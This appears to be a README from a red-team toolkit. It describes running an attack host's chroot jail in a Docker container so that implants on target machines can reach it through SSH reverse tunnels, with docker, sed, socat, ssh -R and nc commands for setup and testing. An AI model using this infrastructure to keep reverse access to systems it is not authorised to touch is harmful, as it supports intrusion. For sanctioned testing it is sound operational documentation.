# Containerized attack host (defense in depth)

Runs the chroot jail from `../chroot_setup.sh` inside a container instead of
directly on the attack host. Independent of `../lab/` — that directory is a
throwaway environment for exercising the implant scripts end to end; this one
is a real, persistent setup meant to actually be used, that you can also spin
up and test locally the same way.

**Why**: `chroot_setup.sh`'s sshd hardening (`AllowTcpForwarding remote`,
`PermitListen`, `PermitTTY no`, `ForceCommand`) already blocks a stolen key
from doing anything but the implant's own reverse forward. Running that same
setup inside a container adds a second, independent layer — even an escape
vector nobody has thought of yet is still contained by the container's own
network namespace, which has no route to anything on the real attack host
except what you explicitly bridge out. Do the sshd hardening regardless of
whether you containerize; this is additive, not a replacement.

`chroot_setup.sh` is copied into the image at build time (`Dockerfile`'s
`COPY chroot_setup.sh /root/chroot_setup.sh`) rather than bind-mounted, so the
container doesn't depend on this checkout persisting on disk. Don't
`docker compose down -v` between engagements — stop/start the container,
never recreate it, and the chroot jail, keypair, and sshd_config all survive
in its own writable layer without needing named volumes.

## 1. Build and start it

    cd attackhost
    docker compose up -d --build

## 2. Run chroot_setup.sh inside it, unmodified

    docker exec -it attackhost bash /root/chroot_setup.sh

Same script, same output as running it directly on a bare host.

## 3. One container-specific step: make the reverse-forward bind reachable

`-R 127.0.0.1:$REMLIS:...` binds loopback *inside the container's own network
namespace* — a different loopback than the container's bridge IP, and not
reachable from it. Add `GatewayPorts` to the `Match` block so the bind lands
on all of the container's interfaces instead. `PermitListen` still restricts
what the client may ask for; `GatewayPorts` only changes where the server
actually places the resulting listener — it doesn't touch
`AllowTcpForwarding`/`PermitTTY`/`ForceCommand`, so a stolen key still can't
`-L`/`-D` pivot or get a shell.

    docker exec attackhost bash -c "
    sed -i '/PermitListen 127.0.0.1:\*/a\  GatewayPorts yes' /etc/ssh/sshd_config
    systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null || service sshd reload 2>/dev/null || kill -HUP \"\$(pgrep -o -x sshd)\"
    "

## 4. Per engagement: map a host port to the container as REMLIS is chosen

`docker run -p` is fixed at container creation, so use `socat` to bridge a
host port to the container's internal IP on demand instead — no container
restart needed, and it's the same tool this repo already uses for the
`CHK_IP` beacon listener.

    socat TCP-LISTEN:<REMLIS>,bind=127.0.0.1,fork,reuseaddr TCP:172.31.0.10:<REMLIS> &

Pick `REMLIS` to match on both sides and every `Access`/`Exit` doc command
works completely unmodified — you're still connecting to `127.0.0.1:<REMLIS>`.
Kill this `socat` process when you're done with that engagement; nothing else
needs to be torn down on the container side.

From here, `Implant_Procedure`/`Access`/`Exit` apply exactly as written —
wherever they say run a command "On Attack Host", run it via
`docker exec -it attackhost bash` instead of directly on a host shell.

## Testing it locally

You don't need a real target (or `../lab/`) to confirm this actually works —
simulate the target side from your own machine using the key the container
just generated:

    docker cp attackhost:/home/chroot/id_rsa /tmp/test_id_rsa
    chmod 600 /tmp/test_id_rsa

    # PubkeyAuthentication starts disabled by design (see Access docs) —
    # enable it first, same as you would before a real engagement
    docker exec attackhost bash -c "
    sed -i 's/PubkeyAuthentication no #/PubkeyAuthentication yes #/' /etc/ssh/sshd_config
    systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null || service sshd reload 2>/dev/null || kill -HUP \"\$(pgrep -o -x sshd)\"
    "

    # Before the GatewayPorts step: this should refuse
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/test_id_rsa \
      -N -R 127.0.0.1:2200:127.0.0.1:22 -l user 172.31.0.10 &
    sleep 2 && nc -zv 172.31.0.10 2200   # connection refused

    # Apply the GatewayPorts step (section 3), then re-establish the forward
    # (already-open forwards don't move — only new ones bind differently)
    kill %1; sleep 1
    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/test_id_rsa \
      -N -R 127.0.0.1:2200:127.0.0.1:22 -l user 172.31.0.10 &
    sleep 2 && nc -zv 172.31.0.10 2200   # succeeds

    kill %1   # stop the test forward
    rm -f /tmp/test_id_rsa

If you also want a full round trip through a real reverse tunnel and an
actual target sshd, pair this with `../lab/target` instead of building a
one-off — see `../lab/README.md`.

## Tear down

    docker compose down -v
